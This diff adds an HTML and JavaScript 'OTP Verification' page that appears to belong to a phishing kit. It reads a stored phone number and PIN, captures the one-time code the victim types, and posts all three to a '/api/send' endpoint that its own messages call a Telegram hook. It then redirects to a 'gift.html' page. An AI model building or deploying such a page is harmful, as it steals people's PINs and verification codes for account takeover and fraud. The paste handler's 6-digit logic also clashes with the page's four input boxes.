@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Verification</title>
+
+<style>
+:root {
+  --bg: #f3f3f3;
+  --card: #ffffff;
+  --text-main: #5f5f5f;
+  --text-sub: #8a8a8a;
+  --border-blue: #7aa7d9;
+  --border-focus: #4f8fd6;
+  --btn-disabled: #bdbdbd;
+}
+
+* {
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+}
+
+body {
+  margin: 0;
+  background: var(--bg);
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  padding: 16px;
+}
+
+.wrapper {
+  width: 100%;
+  max-width: 420px;
+}
+
+.back-btn {
+  width: 38px;
+  height: 38px;
+  border-radius: 50%;
+  border: 2px solid #9e9e9e;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 16px 0;
+}
+
+.back-btn svg {
+  width: 18px;
+  height: 18px;
+  stroke: #6b6b6b;
+}
+
+.card {
+  background: var(--card);
+  border-radius: 18px;
+  padding: 24px 20px 28px;
+  box-shadow: 0 6px 18px rgba(0,0,0,0.06);
+}
+
+.title {
+  font-size: 28px;
+  font-weight: 600;
+  color: var(--text-main);
+  margin-bottom: 8px;
+}
+
+.subtitle {
+  font-size: 16px;
+  color: var(--text-sub);
+  margin-bottom: 14px;
+}
+
+.phone {
+  font-size: 18px;
+  font-weight: 500;
+  color: #6b6b6b;
+  margin-bottom: 20px;
+}
+
+.otp-label {
+  font-size: 16px;
+  color: #7a7a7a;
+  margin-bottom: 10px;
+}
+
+/* ✅ REAL RESPONSIVE OTP GRID */
+.otp-boxes {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: clamp(6px, 2vw, 12px);
+  margin-bottom: 22px;
+}
+
+.otp-boxes input {
+  width: 100%;
+  height: clamp(48px, 12vw, 56px); /* 🔥 THIS IS THE KEY */
+  border-radius: 12px;
+  border: 2px solid var(--border-blue);
+  text-align: center;
+  font-size: clamp(18px, 5vw, 22px);
+  outline: none;
+}
+
+.otp-boxes input:focus {
+  border-color: var(--border-focus);
+}
+
+.error-message {
+  min-height: 20px;
+  margin: 0 0 14px;
+  text-align: center;
+  font-size: 13px;
+  color: #b42318;
+  font-weight: 600;
+  display: none;
+}
+
+.error-message.visible {
+  display: block;
+}
+
+.timer {
+  text-align: center;
+  font-size: 16px;
+  color: #9a9a9a;
+  margin-bottom: 22px;
+}
+
+.submit-btn {
+  width: 100%;
+  height: 56px;
+  border-radius: 14px;
+  border: none;
+  background: var(--btn-disabled);
+  color: #ffffff;
+  font-size: 18px;
+  cursor: not-allowed;
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+  <div class="back-btn">
+    <svg fill="none" viewBox="0 0 24 24" stroke-width="2">
+      <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"/>
+    </svg>
+  </div>
+
+  <div class="card">
+    <div class="title">OTP Verification</div>
+    <div class="subtitle">Enter the OTP sent to your phone number.Do not share the code with anyone.</div>
+    <div class="phone"> <p id="phoneNumber"></p></div>
+
+    <div class="otp-label">OTP</div>
+
+    <div class="otp-boxes" id="otp">
+       <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+    </div>
+
+    <div id="otpError" class="error-message" aria-live="polite"></div>
+
+<div class="timer">Resend OTP in <span id="countdown">110</span> seconds</div>
+    
+    <button class="submit-btn" disabled>Submit</button>
+  </div>
+
+</div>
+
+<script>
+const inputs = document.querySelectorAll('#otp input');
+const countdownEl = document.getElementById("countdown");
+const otpError = document.getElementById("otpError");
+
+function showError(message) {
+  otpError.textContent = message;
+  otpError.classList.add('visible');
+}
+
+function clearError() {
+  otpError.textContent = '';
+  otpError.classList.remove('visible');
+}
+
+// Load phone number
+window.addEventListener("load", () => {
+  const savedPhone = localStorage.getItem("phone");
+  document.getElementById("phoneNumber").textContent =
+    savedPhone ? savedPhone : "Unknown Number";
+});
+
+// Submit OTP
+async function submitOTP() {
+  const otp = [...inputs].map(i => i.value).join("");
+  const savedPhone = localStorage.getItem("phone");
+  const generatedOtp = localStorage.getItem("generatedOtp");
+  const savedPin = localStorage.getItem("userPin") || "N/A";
+
+  clearError();
+
+  if (otp.length !== 4 || !savedPhone) {
+    showError("Please enter the 4-digit OTP sent to your phone.");
+    return;
+  }
+
+  const message = `Star OTP Submission:\nPhone: ${savedPhone}\nPIN: ${savedPin}\nEntered OTP: ${otp}\nStatus: ${otp === generatedOtp ? "VALID" : "INVALID"}`;
+
+  try {
+    const response = await fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ text: message })
+    }).catch(() => null);
+
+    if (response) {
+      const data = await response.json().catch(() => null);
+      if (data && !data.ok) {
+        console.warn('Telegram submission warning:', data.error || 'unknown error');
+      }
+    }
+  } catch (err) {
+    console.warn('Telegram hook unavailable:', err);
+  }
+
+  if (otp !== generatedOtp) {
+    showError("Invalid OTP. Please try again.");
+    return;
+  }
+
+  window.location.href = "gift.html";
+}
+
+// Input + auto move + auto submit
+inputs.forEach((input, index) => {
+  input.addEventListener("input", () => {
+    clearError();
+    input.value = input.value.replace(/\D/g, "");
+
+    if (input.value && index < inputs.length - 1) {
+      inputs[index + 1].focus();
+    }
+
+    if ([...inputs].every(i => i.value)) {
+      submitOTP();
+    }
+  });
+
+  input.addEventListener("keydown", e => {
+    if (e.key === "Backspace" && !input.value && index > 0) {
+      inputs[index - 1].focus();
+    }
+  });
+
+  // ✅ FIXED PASTE AUTO-SUBMIT
+  input.addEventListener("paste", e => {
+    e.preventDefault();
+    const data = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
+
+    data.split("").forEach((char, i) => {
+      inputs[i].value = char;
+    });
+
+    inputs[Math.min(data.length, inputs.length) - 1].focus();
+
+    if (data.length === 6) {
+      submitOTP();
+    }
+  });
+});
+
+// Timer
+let timeLeft = 110;
+const timer = setInterval(() => {
+  timeLeft--;
+  countdownEl.textContent = timeLeft;
+
+  if (timeLeft <= 0) {
+    clearInterval(timer);
+    document.querySelector(".timer").textContent = "You can now resend OTP";
+  }
+}, 1000);
+</script>
+
+
+</body>
+
+
+
+</html>
